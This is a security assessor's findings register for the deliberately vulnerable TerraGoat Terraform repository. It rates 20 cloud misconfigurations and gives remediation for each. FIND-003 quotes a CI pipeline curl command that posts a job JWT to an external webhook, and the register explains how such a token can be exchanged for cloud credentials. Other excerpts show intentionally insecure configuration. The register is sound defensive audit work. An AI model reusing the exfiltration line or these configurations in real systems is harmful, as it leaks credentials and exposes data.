# Findings Register

**Assessment:** DevSecOps Track 2 – Multi-Cloud Platform Security  
**Repository:** TerraGoat (deliberately vulnerable Terraform by Bridgecrew)  
**Date:** 2026-07-07  
**Assessor:** Raju Thirumalai  
**Scope:** AWS · Azure · GCP  

Scans were run using Checkov, TFSec, Trivy, and GitLeaks. Raw outputs are in this folder (`checkov-*.json`, `tfsec-*.json`, `trivy-*.json`, `gitleaks-*.json`). This register picks out the 20 findings that represent real, exploitable risk — see `severity-methodology.md` for how findings were selected and rated.

---

## Summary

| ID | Severity | Title | Cloud | File:Line |
|---|---|---|---|---|
| FIND-001 | Critical | Hardcoded AWS credentials in EC2 user_data | AWS | ec2.tf:15-16 |
| FIND-002 | Critical | Hardcoded AWS credentials in Lambda environment variables | AWS | lambda.tf:45-46 |
| FIND-003 | Critical | CI/CD pipeline sends JWT token to external webhook | Pipeline | gitlabci/bla.yml:7 |
| FIND-004 | Critical | S3 bucket storing customer data is publicly accessible with no encryption | AWS | s3.tf:2 |
| FIND-005 | Critical | GCS bucket grants read access to all internet users | GCP | gcs.tf:19-20 |
| FIND-006 | Critical | Azure NSG allows RDP (3389) inbound from any IP | Azure | networking.tf:89-94 |
| FIND-007 | High | Azure NSG allows SSH (22) inbound from any IP | Azure | networking.tf:77-82 |
| FIND-008 | High | AWS security group allows SSH (22) inbound from 0.0.0.0/0 | AWS | ec2.tf:91-95 |
| FIND-009 | High | RDS instance is publicly accessible, unencrypted, and has no backups | AWS | db-app.tf:18-22 |
| FIND-010 | High | IAM user policy uses wildcard actions across all resources | AWS | iam.tf:34-41 |
| FIND-011 | High | GKE cluster has logging and monitoring both disabled | GCP | gke.tf:8-13 |
| FIND-012 | High | GKE legacy ABAC enabled; master endpoint open to 0.0.0.0/0 | GCP | gke.tf:12-19 |
| FIND-013 | High | BigQuery dataset readable by any authenticated Google account | GCP | big_data.tf:24 |
| FIND-014 | High | Azure Key Vault has no network access control list | Azure | key_vault.tf:6 |
| FIND-015 | Medium | KMS key does not have automatic rotation enabled | AWS | kms.tf:3 |
| FIND-016 | Medium | EBS volume is unencrypted; comment in code suggests intentional | AWS | ec2.tf:35-37 |
| FIND-017 | Medium | Load balancer listener uses HTTP only, no HTTPS | AWS | elb.tf:7-9 |
| FIND-018 | Medium | Azure managed disk has encryption explicitly disabled | Azure | storage.tf:8-10 |
| FIND-019 | Medium | Cloud SQL publicly reachable, no backups, SSL not required | GCP | big_data.tf:5-16 |
| FIND-020 | Medium | EKS cluster has no control plane logging and no secrets encryption | AWS | eks.tf:118-128 |

---

## Detailed Findings

---

### FIND-001 · Critical · Hardcoded AWS Credentials in EC2 User Data

**File:** `terraform/aws/ec2.tf` lines 15–16  
**Confirmed by:** TFSec (`AVD-AWS-0029`), Trivy (`AWS-0029`), GitLeaks (`aws-access-token`, `generic-api-key`)

```hcl
export AWS_ACCESS_KEY_ID=AKIA***REDACTED***
export AWS_SECRET_ACCESS_KEY=wJalr***REDACTED***KEY
```

EC2 `user_data` is a bootstrap script that runs as root on instance startup. The problem with putting credentials here is threefold. First, `user_data` is readable via the EC2 Instance Metadata Service (`http://169.254.169.254/latest/user-data`) by any process running on the instance — including any malware or compromised application. Second, it's visible in plaintext in the AWS Console to anyone with `ec2:DescribeInstanceAttribute`. Third, and most permanently, these credentials are now in the git commit history and cannot be removed by simply deleting the file — the key is accessible forever via `git log -p`.

**What this enables:** Anyone who obtains these credentials can authenticate as that IAM user and perform whatever actions the user's policy allows, from any location.

**Fix:** Use IAM Instance Profiles instead. Attach a role to the EC2 instance with only the permissions it needs. The instance then gets temporary credentials automatically from the metadata service — no key ever appears in code.

**MITRE ATT&CK:** T1552.001 – Credentials in Files

---

### FIND-002 · Critical · Hardcoded AWS Credentials in Lambda Environment Variables

**File:** `terraform/aws/lambda.tf` lines 45–46  
**Confirmed by:** Checkov (`CKV_AWS_45`), GitLeaks (`generic-api-key`)

```hcl
environment {
  variables = {
    access_key = "AKIA***REDACTED***"
    secret_key = "wJalr***REDACTED***KEY"
  }
}
```

Lambda environment variables are accessible to anyone with `lambda:GetFunctionConfiguration` — a permission that's often granted broadly because it sounds read-only. They also appear in CloudWatch Logs if the function accidentally prints its environment. Same git-history problem as FIND-001.

**Fix:** Store secrets in AWS Secrets Manager or Parameter Store (SecureString). The Lambda function retrieves them at runtime using the SDK. The Terraform config then only references the secret ARN, not the value.

**MITRE ATT&CK:** T1552.001 – Credentials in Files

---

### FIND-003 · Critical · CI/CD Pipeline Sends JWT Token to External Webhook

**File:** `gitlabci/bla.yml` line 7  
**Confirmed by:** Manual code review

```yaml
deploy:
  script: 'curl -H "Content-Type: application/json" -X POST --data "$CI_JOB_JWT_V1" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826'
```

`CI_JOB_JWT_V1` is a short-lived OIDC token that GitLab generates for every pipeline job. It contains signed claims about the project, namespace, and pipeline. The line above POSTs this token to `webhook.site` — a free public debugging tool that logs every request it receives.

The risk is that cloud providers can be configured to trust GitLab's OIDC tokens. If AWS has a role with a trust policy like `"Federated": "https://gitlab.com"`, an attacker who receives this token can call `sts:AssumeRoleWithWebIdentity` and get temporary AWS credentials valid for up to an hour. No password needed — the JWT itself is the proof of identity.

Additional issues: the base image is `redis:latest` with no digest pin. If the `latest` tag is updated (by anyone with push access to that image), the next pipeline run uses the new image with no warning.

**Fix:** Remove the `curl` line entirely — it serves no legitimate deployment purpose. For OIDC-based cloud auth, use GitLab's `id_tokens` keyword with a specific audience, not `CI_JOB_JWT_V1`. Pin the image to a specific digest (`redis@sha256:...`).

**MITRE ATT&CK:** T1552.004 – Private Keys, T1567 – Exfiltration Over Web Service

---

### FIND-004 · Critical · Public S3 Bucket Storing Customer PII with No Encryption

**File:** `terraform/aws/s3.tf` line 2 (`aws_s3_bucket.data`)  
**Confirmed by:** Checkov (`CKV_AWS_53`, `CKV_AWS_19`, `CKV_AWS_21`, `CKV2_AWS_6`), TFSec (`AVD-AWS-0107`)

The code comment on line 2 literally states `# bucket is public`. The same resource uploads `customer-master.xlsx` via `aws_s3_bucket_object`. The bucket has no server-side encryption, no versioning, no access logging, and no `aws_s3_bucket_public_access_block` resource blocking public ACLs.

Anyone with the bucket name (which is deterministic from the naming pattern) can list and download all objects, including the customer file. There is no authentication required.

**Regulatory exposure:** GDPR Article 5 requires personal data to be processed securely. A publicly accessible unencrypted bucket containing customer records is a textbook Article 33 reportable breach.

**Fix:** Add `aws_s3_bucket_public_access_block` with all four attributes set to `true`. Add `aws_s3_bucket_server_side_encryption_configuration` using KMS. Enable versioning and access logging.

**MITRE ATT&CK:** T1530 – Data from Cloud Storage Object

---

### FIND-005 · Critical · GCS Bucket Grants Read Access to All Internet Users

**File:** `terraform/gcp/gcs.tf` lines 19–20  
**Confirmed by:** TFSec (`AVD-GCP-0027`), Trivy

```hcl
resource "google_storage_bucket_iam_binding" "allow_public_read" {
  members = ["allUsers"]
  role    = "roles/storage.objectViewer"
}
```

`allUsers` in GCP IAM means everyone — including unauthenticated, anonymous requests. This is the GCP equivalent of FIND-004. Any object in this bucket is readable by anyone without a Google account or any credentials.

**Fix:** Remove the `allUsers` IAM binding. If the bucket genuinely needs to serve public content (e.g., a static website), use a Cloud CDN + Cloud Load Balancer in front of it with signed URLs, not a blanket `allUsers` binding.

**MITRE ATT&CK:** T1530 – Data from Cloud Storage Object

---

### FIND-006 · Critical · Azure NSG Allows RDP (3389) Inbound from Any IP

**File:** `terraform/azure/networking.tf` lines 89–94  
**Confirmed by:** TFSec (`AVD-AZU-0047`), Trivy (`AZU-0048`), Checkov

```hcl
security_rule {
  name                  = "AllowRDP"
  source_address_prefix = "*"
  destination_port_range = "3389-3389"
}
```

RDP exposed to the internet is the most common initial access vector for ransomware. Automated scanners find open port 3389 within minutes of a VM being provisioned. Combined with a weak password or an unpatched RDP vulnerability (e.g., BlueKeep, DejaBlue), this is a direct path to full VM compromise.

**Fix:** Set `source_address_prefix` to a specific corporate CIDR or management IP range. Better: disable RDP entirely and use Azure Bastion for remote access — it proxies RDP over HTTPS from the Azure portal, so port 3389 never needs to be exposed.

**MITRE ATT&CK:** T1190 – Exploit Public-Facing Application, T1133 – External Remote Services

---

### FIND-007 · High · Azure NSG Allows SSH (22) Inbound from Any IP

**File:** `terraform/azure/networking.tf` lines 77–82  
**Confirmed by:** TFSec (`AVD-AZU-0047`), Trivy, Checkov

Same pattern as FIND-006 but for SSH. Source is `*` with destination port `22-22`. SSH brute-force bots are continuously scanning the internet — an open port 22 will see login attempts within seconds of deployment.

**Fix:** Restrict `source_address_prefix` to a known IP range. Or, like FIND-006, replace SSH access with Azure Bastion.

---

### FIND-008 · High · AWS Security Group Allows SSH (22) Inbound from 0.0.0.0/0

**File:** `terraform/aws/ec2.tf` lines 91–95  
**Confirmed by:** TFSec (`AVD-AWS-0107`), Trivy, Checkov

```hcl
ingress {
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}
```

Same impact as FIND-007 on the AWS side. Port 22 open to `0.0.0.0/0` means every address on the internet can attempt to connect.

**Fix:** Replace with AWS Systems Manager Session Manager. This removes the need for port 22 entirely — sessions are established through the SSM agent over HTTPS. No inbound security group rule needed at all.

---

### FIND-009 · High · RDS Instance Publicly Accessible, Unencrypted, Zero Backup Retention

**File:** `terraform/aws/db-app.tf` lines 18–22  
**Confirmed by:** Checkov (`CKV_AWS_17`, `CKV_AWS_133`, `CKV_AWS_157`), TFSec, Trivy

```hcl
publicly_accessible     = true
storage_encrypted       = false
backup_retention_period = 0
multi_az                = false
monitoring_interval     = 0
```

Five separate issues on one resource. `publicly_accessible = true` means the RDS endpoint resolves to a public IP — the database is reachable from the internet (subject to security group rules). `storage_encrypted = false` means the data on disk is in plaintext — anyone with physical or snapshot access can read it. `backup_retention_period = 0` means there are no automated backups at all. If the database is deleted or corrupted, there is no recovery path. `multi_az = false` is a single point of failure — one availability zone outage takes the database down. `monitoring_interval = 0` means no enhanced monitoring, so performance issues or unusual query patterns go undetected.

**Important note on encryption:** You cannot enable encryption on an existing unencrypted RDS instance in-place. It requires creating a snapshot, encrypting the snapshot, and restoring to a new instance. This is a breaking change — catching it in Terraform before first deployment is the entire point of IaC scanning.

**Fix:** Set `publicly_accessible = false`, `storage_encrypted = true` with a KMS key, `backup_retention_period = 7` (minimum), `multi_az = true`, `monitoring_interval = 60`.

---

### FIND-010 · High · IAM User Policy Uses Wildcard Actions Across All Resources

**File:** `terraform/aws/iam.tf` lines 34–41  
**Confirmed by:** Trivy (`AWS-0346`), Checkov (`CKV_AWS_*`)

```hcl
"Action": ["ec2:*", "s3:*", "lambda:*", "cloudwatch:*"],
"Effect": "Allow",
"Resource": "*"
```

This policy grants the user unlimited EC2, S3, Lambda, and CloudWatch operations on every resource in the account. If this user's credentials are compromised (and they are — see FIND-001 and FIND-002 for the pattern), the attacker can enumerate all EC2 instances, read all S3 buckets, invoke any Lambda function, and modify CloudWatch alarms.

**Principle of least privilege:** A policy should grant exactly the actions a specific workload needs on specific resources — not a broad service wildcard on `Resource: *`.

**Fix:** Identify what this user actually needs to do and write an explicit policy. For example, if it only reads from one S3 bucket: `s3:GetObject` on `arn:aws:s3:::specific-bucket/*`.

**MITRE ATT&CK:** T1078 – Valid Accounts, T1548 – Abuse Elevation Control Mechanism

---

### FIND-011 · High · GKE Cluster Has Logging and Monitoring Disabled

**File:** `terraform/gcp/gke.tf` lines 8 and 13  
**Confirmed by:** Checkov (`CKV_GCP_8`, `CKV_GCP_9`), TFSec, Trivy

```hcl
logging_service    = "none"
monitoring_service = "none"
```

With both set to `"none"`, there is no visibility into what is happening inside the Kubernetes cluster. No pod logs shipped to Cloud Logging. No metrics to Cloud Monitoring. If a pod is compromised, a cryptominer is running, or an attacker is moving laterally through the cluster, there is no audit trail and no alerting.

Mean time to detect (MTTD) with no logging is effectively infinite — you only find out about an incident when external impact is noticed (billing spike, outage, data reported by a third party).

**Fix:** Set `logging_service = "logging.googleapis.com/kubernetes"` and `monitoring_service = "monitoring.googleapis.com/kubernetes"`. Both are free up to GKE's included quota.

---

### FIND-012 · High · GKE Legacy ABAC Enabled; Master Endpoint Open to 0.0.0.0/0

**File:** `terraform/gcp/gke.tf` lines 12 and 19  
**Confirmed by:** Checkov (`CKV_GCP_38`, `CKV_GCP_25`), TFSec

```hcl
enable_legacy_abac = true
master_authorized_networks_config {
  cidr_blocks { cidr_block = "0.0.0.0/0" }
}
```

Two issues here. Legacy ABAC (Attribute-Based Access Control) was the original Kubernetes access control model, replaced by RBAC in Kubernetes 1.6. When both are enabled, ABAC acts as an additional, less secure path to cluster access that bypasses RBAC policies. It should be disabled on all modern clusters.

The master authorized networks config with `0.0.0.0/0` means the Kubernetes API server (`kubectl`) endpoint is reachable from the entire internet. Any valid credential can be used to interact with the cluster from anywhere.

**Fix:** Set `enable_legacy_abac = false`. Set `master_authorized_networks_config` to the specific CIDR of your admin network or VPN.

---

### FIND-013 · High · BigQuery Dataset Readable by Any Authenticated Google Account

**File:** `terraform/gcp/big_data.tf` line 24  
**Confirmed by:** TFSec (`AVD-GCP-0046`), Trivy

```hcl
access {
  special_group = "allAuthenticatedUsers"
  role          = "READER"
}
```

`allAuthenticatedUsers` means any person with a Google account — including free personal Gmail accounts. This is not the same as "internal only". Any of the roughly 3 billion Google account holders can read every table in this dataset. If the dataset contains operational or financial data, this is a serious data exposure.

**Fix:** Remove the `allAuthenticatedUsers` access block. Grant `READER` only to specific service accounts or user groups that actually need it.

---

### FIND-014 · High · Azure Key Vault Has No Network Access Control List

**File:** `terraform/azure/key_vault.tf` line 6  
**Confirmed by:** TFSec (`AVD-AZU-0013`), Trivy, Checkov (`CKV_AZURE_109`)

The `azurerm_key_vault` resource has no `network_acls` block. Without this, the Key Vault is accessible from any network — not just Azure virtual networks or known CIDRs. This vault stores keys and secrets (including `azurerm_key_vault_secret`). Unrestricted network access widens the attack surface significantly.

**Fix:** Add a `network_acls` block with `default_action = "Deny"` and an explicit `ip_rules` or `virtual_network_subnet_ids` allowlist. Also add `soft_delete_enabled = true` and `purge_protection_enabled = true` to prevent accidental or malicious deletion of keys.

---

### FIND-015 · Medium · KMS Key Does Not Have Automatic Rotation Enabled

**File:** `terraform/aws/kms.tf` line 3  
**Confirmed by:** Checkov (`CKV_AWS_7`), TFSec

```hcl
resource "aws_kms_key" "logs_key" {
  # key does not have rotation enabled
  description             = "..."
  deletion_window_in_days = 7
}
```

The code comment itself flags this. Without `enable_key_rotation = true`, the KMS key material never changes. If the key is ever compromised, all data encrypted with it remains at risk indefinitely. AWS KMS supports automatic annual rotation of customer-managed keys at no extra cost.

**Fix:** Add `enable_key_rotation = true`. Also the `deletion_window_in_days = 7` is the minimum — for a key protecting logs (which may be needed for forensics), a longer window (14–30 days) is safer.

---

### FIND-016 · Medium · EBS Volume Unencrypted; Comment Suggests Intentional

**File:** `terraform/aws/ec2.tf` lines 35–37  
**Confirmed by:** Checkov (`CKV_AWS_3`), TFSec

```hcl
resource "aws_ebs_volume" "web_host_storage" {
  # unencrypted volume
  #encrypted = false  # Setting this causes the volume to be recreated on apply
```

The comment reveals the author was aware of the issue but disabled encryption to avoid Terraform forcing a resource recreation. This is a common workaround that leaves data at rest unprotected. EBS snapshots from this volume are also unencrypted (`aws_ebs_snapshot.example_snapshot`).

**Fix:** Set `encrypted = true` and provide a `kms_key_id`. Yes, enabling encryption on an existing volume requires recreation — the right answer is to plan for that, not disable encryption to avoid it.

---

### FIND-017 · Medium · Load Balancer Uses HTTP Only, No HTTPS

**File:** `terraform/aws/elb.tf` lines 7–9  
**Confirmed by:** Checkov (`CKV_AWS_23`, `CKV_AWS_92`), TFSec

```hcl
listener {
  instance_protocol = "http"
  lb_protocol       = "http"
}
```

All traffic between clients and the load balancer (and between the load balancer and instances) is plaintext. This enables passive interception of requests and responses on the network path. PCI-DSS Requirement 4 mandates encryption of cardholder data in transit.

**Fix:** Replace with an HTTPS listener using an ACM certificate. Add an HTTP listener that redirects (301) to HTTPS.

---

### FIND-018 · Medium · Azure Managed Disk Encryption Explicitly Disabled

**File:** `terraform/azure/storage.tf` lines 8–10  
**Confirmed by:** Checkov, TFSec, Trivy

```hcl
encryption_settings {
  enabled = false
}
```

This is explicitly setting encryption off, not just omitting it. Data on this managed disk is stored in plaintext on Azure's physical infrastructure.

**Fix:** Set `enabled = true` within `encryption_settings`, or remove the block entirely (Azure enables server-side encryption by default with platform-managed keys).

---

### FIND-019 · Medium · Cloud SQL Publicly Reachable, No Backups, SSL Not Required

**File:** `terraform/gcp/big_data.tf` lines 5–16  
**Confirmed by:** Checkov (`CKV_GCP_11`, `CKV_GCP_6`, `CKV_GCP_76`), TFSec

```hcl
ip_configuration {
  ipv4_enabled = true
  authorized_networks {
    name  = "WWW"
    value = "0.0.0.0/0"
  }
}
backup_configuration {
  enabled = false
}
```

`ipv4_enabled = true` with `0.0.0.0/0` as an authorized network means the PostgreSQL instance has a public IP and accepts connections from anywhere. `backup_configuration { enabled = false }` removes all automated backups. SSL is not enforced. This database is internet-accessible with no backup recovery option if data is lost.

**Fix:** Set `ipv4_enabled = false` and use Cloud SQL Auth Proxy or Private Service Connect for connectivity. Set `backup_configuration { enabled = true, point_in_time_recovery_enabled = true }`. Enable `require_ssl = true`.

---

### FIND-020 · Medium · EKS Cluster Has No Control Plane Logging or Secrets Encryption

**File:** `terraform/aws/eks.tf` lines 118–128 (`aws_eks_cluster.eks_cluster`)  
**Confirmed by:** Checkov (`CKV_AWS_37`, `CKV_AWS_38`, `CKV_AWS_39`, `CKV_AWS_58`), TFSec

The EKS cluster resource has no `enabled_cluster_log_types` block, meaning none of the five control plane log types are enabled (api, audit, authenticator, controllerManager, scheduler). The `vpc_config` block has no `endpoint_public_access = false`, so the Kubernetes API endpoint remains public. There is no `encryption_config` block, so Kubernetes Secrets stored in etcd are not encrypted with a KMS key.

**Fix:** Add `enabled_cluster_log_types = ["api", "audit", "authenticator", "controllerManager", "scheduler"]`. Set `endpoint_public_access = false` and `endpoint_private_access = true` (which is already set). Add an `encryption_config` block with a KMS key for secrets.

---

## Raw Scan Summary

For reference — total check failures from automated tools before filtering:

| Tool | AWS Failures | Azure Failures | GCP Failures | Total |
|---|---|---|---|---|
| Checkov | 215 | 174 | 56 | 445 |
| TFSec | 119 | 86 | 41 | 246 |
| Trivy | 115 | 90 | 49 | 254 |
| GitLeaks secrets | 4 unique secrets across AWS (ec2.tf, lambda.tf) and Azure (sql.tf, postgres.tf) | | | |

The 20 findings above are the subset of these results that represent distinct, exploitable or high-impact issues. Everything else is either a duplicate of the same root cause, a checklist item with no real attack path, or a Terraform state management quirk rather than a security flaw.
